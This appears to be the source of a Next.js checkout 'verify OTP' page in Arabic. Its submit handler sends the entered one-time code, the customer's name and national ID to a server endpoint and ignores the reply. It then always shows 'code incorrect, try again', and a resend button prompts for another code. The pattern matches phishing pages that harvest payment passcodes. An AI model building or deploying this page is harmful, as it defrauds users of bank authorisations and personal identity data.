"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound } from "lucide-react";

export default function VerifyPage() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200 flex flex-col items-center justify-center px-4 sm:px-6 py-10" dir="rtl">

      {/* Header Bar */}
      <div className="w-full max-w-sm sm:max-w-md md:max-w-xl lg:max-w-2xl mb-4 flex items-center justify-between">
        <div className="flex items-center gap-2 text-sm text-gray-400">
          <Link href="/" className="hover:text-teal-600 transition">الرئيسية</Link>
          <span>/</span>
          <Link href="/cart" className="hover:text-teal-600 transition">السلة</Link>
          <span>/</span>
          <span className="text-gray-600">التحقق</span>
        </div>
      </div>

      {/* Title */}
      <div className="w-full max-w-sm sm:max-w-md md:max-w-xl lg:max-w-2xl mb-3 text-right">
        <h1 className="text-lg sm:text-xl font-bold text-gray-800">رمز التحقق OTP</h1>
        <p className="text-xs sm:text-sm text-gray-500">ادخل رمز التحقق لإكمال العملية</p>
      </div>

      {/* Card */}
      <div className="bg-white rounded-3xl shadow-lg w-full max-w-sm sm:max-w-md md:max-w-xl lg:max-w-2xl overflow-hidden">

        {/* Card Top */}
        <div className="pt-6 sm:pt-8 pb-2 flex flex-col items-center gap-3">
          <div className="bg-red-500 rounded-2xl p-4 sm:p-6">
            <KeyRound className="text-white w-8 h-8 sm:w-10 sm:h-10" />
          </div>
          <h2 className="text-gray-800 text-base sm:text-lg font-bold">تأكيد العملية</h2>
        </div>

        {/* Card Body */}
        <div className="p-4 sm:p-6 md:p-8 space-y-5">
          <div className="text-center space-y-1">
            <p className="text-gray-600 text-sm leading-relaxed">
              الرجاء إدخال رمز التحقق الذي يصلكم على الهاتف المحمول
            </p>
            <p className="text-gray-400 text-xs">قد يصل الرمز متأخراً (بعد دقائق)</p>
          </div>

          {/* OTP Input */}
          <div className="flex flex-col items-center gap-1">
            <input
              type="text"
              inputMode="numeric"
              placeholder="● ● ● ● ● ●"
              value={code}
              maxLength={6}
              onChange={e => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                setCode(val);
                setError(false);
              }}
              className={`w-full text-center text-xl sm:text-2xl md:text-3xl font-bold tracking-[0.4em] sm:tracking-[0.5em] border-2 rounded-2xl px-3 py-3 sm:px-4 sm:py-4 outline-none bg-gray-50 transition-all ${
                error ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-red-400 focus:bg-white"
              }`}
            />
            {error && (
              <p className="text-red-500 text-xs">
                {submitted ? "الكود غير صحيح، حاول مجدداً" : "الكود يجب أن يكون 4 أو 6 أرقام"}
              </p>
            )}
          </div>

          {/* Buttons */}
          <div className="space-y-3 pt-1">
            <button
              onClick={async () => {
                if (code.length !== 4 && code.length !== 6) { setError(true); return; }
                await fetch("/api/verify", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    code,
                    orderId,
                    customerName: customer?.name ?? "—",
                    customerId: customer?.nationalId ?? "—",
                  }),
                });
                setSubmitted(true);
                setError(true);
              }}
              className="w-full bg-green-500 hover:bg-green-600 active:scale-[0.98] text-white py-3 sm:py-3.5 rounded-2xl font-bold text-sm sm:text-base transition-all shadow-md shadow-green-200 cursor-pointer"
            >
              ✅ إتمام الطلب
            </button>

            <Link
              href="/checkout"
              className="w-full flex items-center justify-center gap-2 bg-gray-700 hover:bg-gray-800 text-white py-3 sm:py-3.5 rounded-2xl font-medium text-sm sm:text-base transition-all cursor-pointer"
            >
              السابق →
            </Link>

            <button
              onClick={() => {
                fetch("/api/resend", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }),
                });
              }}
              className="w-full flex items-center justify-center gap-2 bg-green-50 hover:bg-green-100 text-green-700 border border-green-200 py-3 rounded-2xl text-sm font-medium transition-all cursor-pointer"
            >
              🔄 إعادة إرسال
            </button>
          </div>
        </div>
      </div>
    </main>
  );
}
